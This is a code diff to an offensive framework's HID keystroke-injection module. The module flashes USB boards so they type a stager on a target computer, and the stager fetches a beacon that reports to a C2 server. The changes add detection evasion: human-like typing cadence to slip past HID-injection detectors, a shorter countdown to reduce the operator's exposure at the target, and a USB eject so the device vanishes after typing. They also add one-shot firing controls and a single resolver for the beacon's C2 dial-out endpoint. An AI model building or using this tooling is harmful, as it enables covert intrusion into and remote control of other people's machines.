@@ -288,10 +288,14 @@ class PayloadModule(BaseModule):
           --target <os>   deprecated alias of --type-into (it is NOT the
                           engagement target: that one is `targets add`)
           --layout <l>    the keyboard layout the TARGET has active
-                          (us|it, default us). The board sends US scan
-                          codes, so on an Italian target / ( = {} @ # come
-                          out wrong unless the command is pre-translated
-                          for that layout.
+                          (us|it, default `auto` = this machine's locale).
+                          The board sends US scan codes, so on an Italian
+                          target `:` `:` `?` `{}` `@` `#` come out wrong
+                          unless the command is pre-translated for that
+                          layout: a US `:` is Shift+`;`, which an Italian
+                          keyboard reads as `ç`. Nothing on the board can
+                          read the target's layout, so this is stated in the
+                          artefact rather than guessed silently.
           --stager <os>   build the PHANTOM stager for that OS with the
                           current C2 endpoint and type THAT (instead of
                           pasting a command by hand). The stager is
@@ -337,6 +341,53 @@ class PayloadModule(BaseModule):
                           data/vectors/)
           --delay <ms>    wait before typing (default 1500: the host has to
                           enumerate the HID device first)
+          --countdown <s>
+                          seconds on a BLINKING LED between power-up and the
+                          first keystroke (default 3). This was 15 while the
+                          board was expected to be flashed in place and
+                          unplugged mid-typing; with the one-shot default and
+                          the silent first boot nothing needs rescuing any
+                          more, and 15 s standing in front of the target is
+                          exposure for no reason. `0` skips it. Give a value
+                          here if your board has no LED on LED_BUILTIN (most
+                          Pro Micro clones do not): then the countdown is
+                          time you cannot see.
+          --no-first-boot-safe
+                          turn OFF the first-boot guard. By default the first
+                          boot after a flash is SILENT: a per-build tag in
+                          EEPROM (Arduino/AVR) or nvm (Pico) does not match,
+                          so the sketch cannot type on the machine that just
+                          flashed it and fires on the NEXT power-up. Disable
+                          only if you need the board to fire the moment the
+                          upload finishes.
+          --cadence <ms>  average milliseconds PER TYPED CHARACTER (default
+                          10, ~100 chars/s) with a jittered pause between
+                          bursts. A board at full speed types a 260-char
+                          stager in a fraction of a second, which is the
+                          second thing a HID-injection detector sees after
+                          the device itself; this costs ~2.5 s of visible
+                          typing instead. `0` types the command in one burst.
+                          keystrokes long before the cadence stops looking
+                          human. Not applicable to DuckyScript boards
+                          (flipper, omg): STRING runs at the device's fixed
+                          rate, and the artefact says so.
+          --nonce <hex>   stamp the artefact with a per-flash nonce (default:
+                          generated automatically when --flash is used). The
+                          first-boot tag is content-derived, so without this a
+                          re-flash of the same artefact looks like the same
+                          build and does NOT clear the one-shot marker: the
+                          board stays mute for ever. Pass it explicitly to
+                          reproduce a specific flash.
+          --shots <n>     Arduino only: how many DELIVERIES one flash is
+                          worth (default 3). The sketch keeps a counter in
+                          EEPROM and decrements it before each delivery;
+                          when it reaches 0 the board stays silent on every
+                          later power-up, so carrying it back to the machine
+                          that flashed it does not re-inject there.
+                          Re-flashing resets it. `--shots 0` = unlimited.
+          --repeat        same as `--shots 0`: fire on EVERY power-up.
+                          Kept as the explicit opt-out; a board with no
+                          counter types on the machine that flashed it too.
           --no-enter      do not press Enter after the command
           --arm           Arduino only: require TWO presses of a button on
                           --arm-pin before the board types. Off by default:
@@ -344,6 +395,14 @@ class PayloadModule(BaseModule):
                           so unplug it before flashing (or it fires on THIS
                           machine). Use it if you reflash often in place.
           --arm-pin <n>   pin the arm button is on (default 7)
+          --eject         after typing, drop the USB connection so the host
+                          stops seeing a keyboard: the board stays powered
+                          and needs a power cycle to come back. This is the
+                          alternative to --countdown when the board is
+                          flashed in place — it disappears instead of
+                          waiting to be unplugged. DuckyScript boards
+                          (flipper, omg) cannot do it, and the artefact says
+                          so instead of pretending.
           --run           open a console first (one chord per target:
                           Win+R on Windows, Ctrl+Alt+T on Linux,
                           Cmd+Space on macOS)
@@ -351,8 +410,14 @@ class PayloadModule(BaseModule):
                           with arduino-cli (compile then upload), e.g.
                           --flash COM5. The sketch folder is created with
                           the name the Arduino toolchain requires.
-          --fqbn <fqbn>   board id for --flash (default arduino:avr:micro;
-                          leonardo is arduino:avr:leonardo)
+                          `--flash auto` (or `detect`) reads the port AND
+                          the board id from `arduino-cli board list`: one
+                          board on the bench is used, zero or several are
+                          refused with what was seen instead of guessed.
+          --fqbn <fqbn>   board id for --flash. Default: the board the
+                          flasher detected, else arduino:avr:micro
+                          (leonardo is arduino:avr:leonardo). An explicit
+                          id still wins over detection.
           --arduino-cli <path>  arduino-cli binary for --flash (default:
                           PATH, else $PHANTOM_ARDUINO_CLI)
 
@@ -368,10 +433,13 @@ class PayloadModule(BaseModule):
               --stager-mode inline
           payload hid leonardo --from-payload 3f2a91c4 --type-into windows \\
               --flash COM5 --fqbn arduino:avr:leonardo
+          payload hid leonardo --stager windows --type-into windows \\
+              --flash auto --eject --countdown 0
         """
         from phantom.utils.hid_builder import (
-            ALL_BOARD_NAMES, ARDUINO_BOARDS, board_notes, build_hid_payload,
-            canonical_board, mismatch_hints)
+            ALL_BOARD_NAMES, ARDUINO_BOARDS, DEFAULT_CHAR_DELAY_MS, board_notes,
+            build_hid_payload, canonical_board, mismatch_hints)
+        from phantom.utils.hid_layouts import detected_layout
 
         parts = arg.strip().split()
         board = ""
@@ -383,14 +451,23 @@ class PayloadModule(BaseModule):
         stager_mode = ""
         stager_mode_given = False
         stager_attempts = 0
-        layout = "us"
+        layout = ""
         out = ""
         delay_ms = 1500
+        char_delay_ms = DEFAULT_CHAR_DELAY_MS
+        from phantom.utils.hid_builder import DEFAULT_COUNTDOWN_S
+        countdown_s = DEFAULT_COUNTDOWN_S
+        first_boot_safe = True
+        from phantom.utils.hid_builder import DEFAULT_SHOTS
+        shots = DEFAULT_SHOTS
         press_enter = True
-        open_run = False
+        # None = "decide from the target": see the block after the token loop.
+        open_run = None
         arm = False
         arm_pin = 7
         arm_pin_given = False
+        build_nonce = ""
+        eject = False
         flash = ""
         fqbn = ""
         arduino_cli = ""
@@ -477,12 +554,76 @@ class PayloadModule(BaseModule):
                     return
                 i += 2
                 continue
+            if tok == "--countdown" and i + 1 < len(parts):
+                try:
+                    countdown_s = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--countdown wants seconds (0 skips it)")
+                    return
+                if countdown_s < 0:
+                    notifier.error("--countdown cannot be negative: 0 skips it")
+                    return
+                i += 2
+                continue
+            if tok == "--no-first-boot-safe":
+                first_boot_safe = False
+                i += 1
+                continue
+            if tok == "--nonce" and i + 1 < len(parts):
+                build_nonce = parts[i + 1].strip()
+                i += 2
+                continue
+            if tok == "--shots":
+                if i + 1 >= len(parts):
+                    notifier.error("--shots wants a count (0 = unlimited)")
+                    return
+                try:
+                    shots = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--shots wants a count (0 = unlimited)")
+                    return
+                if shots < 0:
+                    notifier.error("--shots cannot be negative: 0 means "
+                                   "unlimited")
+                    return
+                if shots > 255:
+                    notifier.error("--shots must fit in one EEPROM byte "
+                                   "(0-255)")
+                    return
+                i += 2
+                continue
+            if tok == "--once":
+                shots = 1
+                i += 1
+                continue
+            if tok == "--repeat":
+                shots = 0
+                i += 1
+                continue
+            if tok == "--cadence" and i + 1 < len(parts):
+                try:
+                    char_delay_ms = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--cadence wants milliseconds per "
+                                   "character (0 types the command in one "
+                                   "burst)")
+                    return
+                if char_delay_ms < 0:
+                    notifier.error("--cadence cannot be negative: 0 types "
+                                   "the command in one burst")
+                    return
+                i += 2
+                continue
             if tok == "--no-enter":
                 press_enter = False
                 i += 1
                 continue
             if tok == "--run":
                 open_run = True
+                i += 1
+                continue
+            if tok in ("--no-run", "--no-open"):
+                open_run = False
                 i += 1
                 continue
             if tok == "--arm":
@@ -497,6 +638,10 @@ class PayloadModule(BaseModule):
                     return
                 arm_pin_given = True
                 i += 2
+                continue
+            if tok == "--eject":
+                eject = True
+                i += 1
                 continue
             if tok == "--strict":
                 strict = True
@@ -515,6 +660,25 @@ class PayloadModule(BaseModule):
             command = (command + " " + tok).strip()
             i += 1
 
+        # A WINDOWS PAYLOAD WITH NO OPENER TYPES INTO THE VOID. Measured
+        # 2026-11-02 on the lab HP: the board typed from the SECOND word (the
+        # first ones were eaten while focus settled), nothing executed, and
+        # the operator had to read a command that started mid-word to find
+        # out why. "I forgot --run" must not be a silent wrong flash, so for a
+        # Windows target the opener is the DEFAULT and `--no-run` is the
+        # explicit opt-out. Linux/macOS openers stay opt-in: their console
+        # shortcut depends on the desktop and guessing is the same failure.
+        if open_run is None:
+            open_run = (target or "").strip().lower() == "windows"
+
+        # `--flash auto` means "find the board yourself": arduino-cli board
+        # list reports the port and the FQBN together, so the operator should
+        # not have to know whether the bench says COM5 or COM7 today. `-` and
+        # `detect` are accepted for the same thing because typing a literal
+        # dash is what people reach for.
+        flash_port = ("" if (flash or "").strip().lower()
+                      in ("auto", "detect", "-") else flash)
+
         if not board:
             notifier.error(
                 f"hid wants a board: {', '.join(ALL_BOARD_NAMES)}")
@@ -531,6 +695,24 @@ class PayloadModule(BaseModule):
             notifier.error("--flash uploads through arduino-cli, which only "
                            "serves the 'arduino' board")
             return
+        # THE LAYOUT IS A PROPERTY OF THE TARGET AND IT HAS NO HONEST DEFAULT.
+        # A board sends US scan codes and the target translates them, so a US
+        # `:` (Shift+`;`) arrives as `ç` on an Italian keyboard: the URL typed
+        # on screen became `192.168.1.155ç9443` while the sketch looked right.
+        # Nothing on the board can read the target back, so the operator's own
+        # locale is the best available signal — stated out loud, overridable
+        # with --layout, and never silent.
+        if layout in ("", "auto"):
+            layout = detected_layout()
+            notifier.info(
+                f"keyboard layout {layout}: from this machine's locale, since "
+                f"the target's cannot be read from a keyboard — override with "
+                f"--layout us|it if the bench and the target differ")
+        elif layout == "us" and detected_layout() != "us":
+            notifier.warn(
+                "--layout us on a machine that is not US: right only if the "
+                "target is US as well — otherwise every shifted symbol lands "
+                "as a different character (`:` types `ç` on an Italian layout)")
         # ARMED OR NOT IS A SAFETY PROPERTY, so a flag that cannot take
         # effect is an error, not a silence: an operator who asked for an
         # armed board and got one that fires on power-up has been misled
@@ -765,13 +947,29 @@ class PayloadModule(BaseModule):
             if not _confirm_typing():
                 notifier.warn("cancelled: nothing written.")
                 return
+        # A FLASH MUST LOOK LIKE A NEW BUILD TO THE BOARD. The first-boot tag is
+        # derived from the artefact's content, so re-flashing the SAME artefact
+        # produced the SAME tag: justFlashed() said false, the shot counter
+        # spent by the previous delivery stayed at zero, and the freshly flashed
+        # board typed nothing on the target (measured 2026-11-01). A per-flash
+        # nonce makes "has this board been reflashed" true every time, which is
+        # also what resets the counter exactly once.
+        if not build_nonce and flash:
+            import secrets as _secrets
+            build_nonce = _secrets.token_hex(4)
         try:
             payload = build_hid_payload(board, command, target=target,
                                         layout=layout,
                                         delay_ms=delay_ms,
                                         press_enter=press_enter,
                                         open_run=open_run,
-                                        arm=arm, arm_pin=arm_pin)
+                                        arm=arm, arm_pin=arm_pin,
+                                        eject=eject,
+                                        char_delay_ms=char_delay_ms,
+                                        countdown_s=countdown_s,
+                                        first_boot_safe=first_boot_safe,
+                                        shots=shots,
+                                        build_nonce=build_nonce)
         except ValueError as exc:
             notifier.error(str(exc))
             return
@@ -798,20 +996,37 @@ class PayloadModule(BaseModule):
             if board in ARDUINO_BOARDS and not arm:
                 # The Leonardo resets into setup() the moment the upload
                 # finishes, so a board still plugged into the machine you are
-                # sitting at types on THAT machine. This is not a corner
-                # case, it is what happens on every in-place reflash.
-                notifier.warn(
-                    "this board types as soon as it is powered, and the "
-                    f"upload just ran it on THIS machine ({flash}). Unplug it "
-                    "now if you did not mean to type here; --arm prevents it "
-                    "at the cost of a button on --arm-pin.")
-            from phantom.utils.arduino_flash import (
-                DEFAULT_FQBN, flash_sketch, fqbn_for)
-            notifier.status(f"Flashing {os.path.basename(out)} to {flash} "
-                            f"with arduino-cli...")
-            result = flash_sketch(os.path.dirname(os.path.abspath(out)), flash,
-                                  fqbn=(fqbn or fqbn_for(board_arg)
-                                        or DEFAULT_FQBN),
+                # sitting at CAN type on THAT machine. Two things stop it, and
+                # both are on by default for the first boot: the per-build
+                # EEPROM tag (the boot right after a flash is silent) and
+                # --eject (the board leaves the bus instead of typing).
+                # Warning about a keystroke that cannot happen teaches the
+                # operator to ignore the warning that can.
+                if eject or first_boot_safe:
+                    notifier.info(
+                        "this board will not type on THIS machine: the "
+                        "first-boot guard and/or --eject keep it silent "
+                        "through the upload. It fires on the next power-up, "
+                        "i.e. where you carry it.")
+                else:
+                    notifier.warn(
+                        "this board types as soon as it is powered, and the "
+                        f"upload just ran it on THIS machine "
+                        f"({flash_port or 'auto'}). Unplug it "
+                        "now if you did not mean to type here; --arm prevents "
+                        "it at the cost of a button on --arm-pin.")
+            from phantom.utils.arduino_flash import flash_sketch, fqbn_for
+            notifier.status(
+                f"Flashing {os.path.basename(out)} to "
+                f"{flash_port or 'the board arduino-cli finds'} "
+                f"with arduino-cli...")
+            result = flash_sketch(os.path.dirname(os.path.abspath(out)),
+                                  flash_port,
+                                  # "" here means "whatever the board says it
+                                  # is": the flasher detected it from
+                                  # arduino-cli board list, so pinning the
+                                  # Micro FQBN would undo that detection.
+                                  fqbn=(fqbn or fqbn_for(board_arg) or ""),
                                   cli=(arduino_cli or None))
             for step in result.steps:
                 notifier.info(f"  {step.summary()}")
@@ -821,6 +1036,17 @@ class PayloadModule(BaseModule):
                 notifier.success(result.summary())
             else:
                 notifier.error(result.summary())
+                if not flash_port and not result.steps:
+                    # Nothing was compiled, so the run stopped BEFORE the
+                    # toolchain: the bench was empty, had more than one
+                    # board, or the board is a clone the toolchain does not
+                    # name. The escape hatch is the port the operator can
+                    # read off `arduino-cli board list` themselves. A failed
+                    # COMPILE carries steps, so it never gets this hint.
+                    notifier.info(
+                        "no board was selected automatically: pass the port "
+                        "(`--flash COM7`) or pin the board id "
+                        "(`--fqbn arduino:avr:leonardo`).")
         session.add_note(f"HID payload ({board_arg or board}) -> {out}")
 
     def _get_lhost(self) -> str:
@@ -899,8 +1125,14 @@ class PayloadModule(BaseModule):
         os_string, arch, platform = self._guess_os()
         from phantom.utils import config as cfg
         from phantom.utils.network import c2_use_ssl
-        c2_host = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
-        c2_port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+        # ONE resolution for the endpoint the beacon DIALS. `c2.host` defaults
+        # to 127.0.0.1, which is correct for a lab on this box and useless for
+        # a remote target — and the typed stager has always resolved with
+        # `get_c2_endpoint()` (env -> config -> this box's LAN address). Two
+        # resolvers for one endpoint is how a payload gets built for a host
+        # the operator never saw, or for a tunnel that is already dead.
+        from phantom.utils.network import get_c2_endpoint
+        c2_host, c2_port = get_c2_endpoint()
         # same rule as the HID stager: the scheme follows the listener (and
         # `c2.ssl`), never a literal True
         use_ssl = c2_use_ssl()
@@ -930,7 +1162,20 @@ class PayloadModule(BaseModule):
         # missing just means 'no verdict', never a crash)
         try:
             from phantom.automation.sandbox.sandbox import SandboxEngine
-            verdict = SandboxEngine().preflight(binary)
+            from phantom.utils import beacon_artifacts
+            # The builder seals the plaintext at rest, so the path handed
+            # back may not exist on disk: preflight the SAME bytes through a
+            # throw-away copy instead of skipping the check.
+            staged = binary
+            data = beacon_artifacts.payload(binary)
+            if data is not None and not os.path.exists(binary):
+                import tempfile
+                handle = tempfile.NamedTemporaryFile(delete=False,
+                                                     suffix=".bin")
+                handle.write(data)
+                handle.close()
+                staged = handle.name
+            verdict = SandboxEngine().preflight(staged)
             if verdict.approved:
                 notifier.success("Sandbox preflight: APPROVED.")
             else:
@@ -953,14 +1198,10 @@ class PayloadModule(BaseModule):
         # to exist — announcing "the beacon checks in" with nothing listening
         # was the manual path's version of a false success (audit §1.2).
         from phantom.core.automode import ensure_c2_listener
-        from phantom.utils.network import get_c2_endpoint
-        dial_host, dial_port = get_c2_endpoint()
-        if int(c2_port) != int(dial_port):
-            notifier.warn(f"This dropper dials {c2_host}:{c2_port} but the "
-                          f"configured C2 endpoint is {dial_host}:{dial_port} "
-                          f"— start the listener on {c2_port} so the beacon "
-                          f"has somewhere to check in.")
-        elif ensure_c2_listener():
+        # One resolver, so the dropper's port and the listener's port CANNOT
+        # disagree any more: the "start the listener on <port>" warning this
+        # replaces existed only because the two were resolved in two places.
+        if ensure_c2_listener():
             notifier.success(f"C2 listener up on port {c2_port} — the beacon "
                              f"has somewhere to check in.")
         else:
